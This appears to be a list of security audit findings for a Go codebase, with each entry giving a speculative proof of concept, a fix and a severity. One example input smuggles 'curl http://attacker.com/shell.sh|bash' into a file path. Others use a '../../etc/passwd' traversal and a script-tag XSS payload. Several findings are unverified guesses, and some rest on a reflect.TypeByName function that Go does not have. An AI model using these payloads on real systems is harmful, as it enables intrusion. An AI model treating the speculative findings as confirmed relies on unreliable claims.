findings.poc: Requires source code review of the HTTP transport configuration. If the gRPC client uses a custom TLS config and omits MinVersion, it will accept TLS 1.0/1.1 connections, enabling downgrade attacks (POODLE, etc.). Verify whether the gRPC dialer explicitly sets tls.Config{} with MinVersion: tls.VersionTLS12 or higher. If not, an active man-in-the-middle can force the connection to TLS 1.0.
findings.fix: Explicitly configure TLS: &tls.Config{MinVersion: tls.VersionTLS12} on all gRPC/HTTP clients.
findings.impact: MEDIUM: TLS Downgrade via missing MinVersion on gRPC client

findings.poc: Requires source code review. If the HTTP client used by this codebase does not set tls.Config.MinVersion, it may default to accepting TLS 1.0. An attacker on the network path can force a TLS downgrade, intercepting and modifying traffic in transit.
findings.fix: Set http.Client Transport with tls.Config{MinVersion: tls.VersionTLS12} explicitly.
findings.impact: MEDIUM: TLS Downgrade due to implicit TLS version negotiation

findings.poc: Requires source code review. If text/template is used to generate output that will be served as HTML (e.g., in a CLI help output rendered in a web UI), unsanitized user-controlled data passed to the template could trigger XSS. The attack path: user-supplied OPL file content → parsed into template data → text/template renders → output served without encoding → XSS in victim's browser.
findings.fix: Replace text/template with html/template for any output that renders to HTTP responses, or ensure all user data passed to templates is explicitly escaped.
findings.impact: MEDIUM: XSS via text/template rendering user-supplied OPL content

findings.poc: Requires source code review. text/template does not auto-escape HTML characters. If usage.go formats CLI help/usage info that is subsequently served via HTTP (e.g., a developer portal or /debug endpoints), and any CLI argument descriptions contain user-supplied content, XSS is possible.
findings.fix: Switch to html/template or manually escape all variables inserted into the template.
findings.impact: MEDIUM: XSS via template output rendered in HTTP context

findings.poc: Requires source code review. If migration content is rendered to an HTTP endpoint (e.g., migration status page, debug UI), and any database field names or schema names are passed as template variables, XSS is achievable without auto-escaping from text/template.
findings.fix: Switch to html/template for any output that reaches an HTTP response writer.
findings.impact: MEDIUM: XSS via migration metadata rendered in HTTP context

findings.poc: Requires source code review. If math/rand is used to generate session tokens, permission tokens, or any security-critical identifiers, the output is predictable after observing enough samples. An attacker who observes the PRNG state can reproduce all 'random' values. Attack: 1) Observe a few random values. 2) Seed a clone of the PRNG with the observed state. 3) Predict all subsequent random values. 4) Hijack sessions or forge permissions.
findings.fix: Replace all math/rand usage for security-sensitive randomness with crypto/rand.
findings.impact: CRITICAL: Session/permission token forgery via predictable math/rand

findings.poc: Same as manager_requirements.go. If this file uses math/rand for any security-critical value (e.g., shuffling ACL evaluation order, randomizing retry delays with security implications), the randomness is seedable by an observer.
findings.fix: Replace math/rand with crypto/rand for any operation affecting authorization decisions.
findings.impact: MEDIUM: Predictable randomness in relation tuple traversal logic

findings.poc: Requires source code review. If exec.Command or os/exec is called with any user-controlled input (file paths, environment variables, script content), command injection is possible. Attack: Supply a malicious file path like '/tmp/x; curl http://attacker.com/shell.sh|bash' to achieve RCE on the server.
findings.fix: Validate all inputs passed to exec.Command using strict allowlists. Never pass unsanitized user input to shell commands.
findings.impact: HIGH: Command injection leading to RCE

findings.poc: Requires source code review. If file write operations use user-supplied filenames or paths, path traversal attacks are possible. Attack: User provides '../../etc/passwd' as a filename, appending or overwriting sensitive system files if write permissions allow.
findings.fix: Canonicalize all file paths and validate them against an allowlist of permitted directories.
findings.impact: MEDIUM: Arbitrary file write via path traversal

findings.poc: Requires source code review. reflect.TypeByName takes a string that maps to a type in the binary. If this is used with user-supplied data (e.g., cursor values, API parameters), an attacker can reference internal types like net/http.Request or os.File to bypass type safety, potentially accessing private fields or triggering unintended behavior.
findings.fix: Replace reflect.TypeByName with a explicit factory map or switch statement with controlled type registration.
findings.impact: HIGH: Type confusion via reflect.TypeByName with user-controlled input

findings.poc: Requires source code review. If reflect.TypeByName is used with user-supplied cursor/parameter names, internal struct types can be instantiated dynamically, bypassing constructor validation. An attacker could craft a parameter name matching an internal struct (e.g., 'User' or 'Session') to get a partially initialized object with zero values for private fields, bypassing business logic checks.
findings.fix: Replace dynamic type resolution with an explicit typed factory. Use a registry of allowed types.
findings.impact: MEDIUM: Type confusion via dynamic struct instantiation

findings.poc: Same as line 90 — dynamic type instantiation via reflect.TypeByName on user-controlled input. Enables instantiation of internal types with bypassed initialization logic.
findings.fix: Replace reflect.TypeByName with an explicit factory registry of approved types.
findings.impact: MEDIUM: Type confusion via dynamic struct instantiation

findings.poc: Requires source code review. If the response writer receives user-supplied data (e.g., request path, query parameters, Referer header) without HTML encoding, XSS is possible. Attack: Attacker sends a crafted URL path like /<script>alert(1)</script>. If the 404 handler reflects this unencoded, the script executes in any victim's browser who visits the link.
findings.fix: Use html/template or explicitly html.EscapeString() on all user-supplied data written to the HTTP response. Set Content-Type: text/html and ensure charset is set.
findings.impact: HIGH: Reflected XSS via 404 handler reflecting unsanitized URL
